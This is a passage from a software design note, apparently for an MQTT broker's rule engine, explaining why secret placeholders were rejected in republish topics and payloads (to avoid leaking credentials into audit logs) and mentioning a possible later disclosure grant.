is the way to add it later — as an explicit *disclosure* grant, named
and documented as such — without invalidating stored data (the
strict-scope model is its zero case).

### Allowing the placeholder in MQTT topics and payloads

Considered: permit `$secret{...}` in rule republish topic / payload
templates. Rejected: no compelling use case (the placeholder is for
*outbound* credentials to backends, not for shaping MQTT-protocol
content), and significant downside (audit logs of published
messages would either need to special-case secrets or risk leaking).
Easier to reject at config-validation time than to retrofit
redaction across the MQTT logging path.
